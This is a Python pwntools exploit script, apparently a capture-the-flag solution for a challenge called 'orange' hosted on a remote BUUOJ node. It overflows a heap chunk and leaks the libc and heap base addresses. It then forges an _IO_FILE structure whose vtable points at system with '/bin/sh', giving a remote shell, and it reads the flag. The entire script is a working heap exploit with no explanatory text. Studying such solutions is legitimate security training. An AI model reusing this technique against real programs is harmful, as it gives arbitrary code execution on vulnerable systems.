from pwn import *


# p = process('./orange')
p = remote('node4.buuoj.cn', 25217)
elf = ELF('./orange')
lib = elf.libc


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(size_, mess, price):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)
    p.recvuntil(b':')
    p.sendline(price)
    p.recvuntil(b':')
    p.sendline(b'56746')


def show():
    choice(b'2')


def edit(size_, mess, price):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)
    p.recvuntil(b':')
    p.sendline(price)
    p.recvuntil(b':')
    p.sendline(b'1')


add(0x10, b'aaaa', b'10')
payload = b'a' * 0x18 + p64(0x21) + p64(0) * 3 + p64(0xfa1)
edit(0x40, payload, b'20')
add(0x1000, b'aaaa', b'20')
add(0x400, b' ', b'20')
show()
malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 1536 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
print(hex(base_addr))

system_addr = base_addr + lib.sym['system']
io_list_all = base_addr + lib.sym['_IO_list_all']

edit(0x10, b'a' * 15 + b'b', b'10')
show()
p.recvuntil(b'b')
heap_addr = u64(p.recvuntil(b'\n')[: -1].ljust(8, b'\00')) & 0xfffffffffffffff000
print(hex(heap_addr))

payload = b'a' * 0x400 + p64(0) + p64(0x21) + p64(0) * 2
fake_addr = b'/bin/sh\00' + p64(0x61)
fake_addr += p64(0) + p64(io_list_all-0x10)  # bk
fake_addr += p64(0) + p64(1)
fake_addr = fake_addr.ljust(0xd8, b'\00')
vtable_addr = heap_addr + 0x4f0 + 0xe0
fake_addr += p64(vtable_addr)
fake_addr += p64(0) * 3 + p64(system_addr)
payload = payload + fake_addr
edit(len(payload), payload, b'20')

# gdb.attach(p)
# pause()
sleep(1)
p.sendline(b'1')
p.sendline(b'cat flag')
p.interactive()
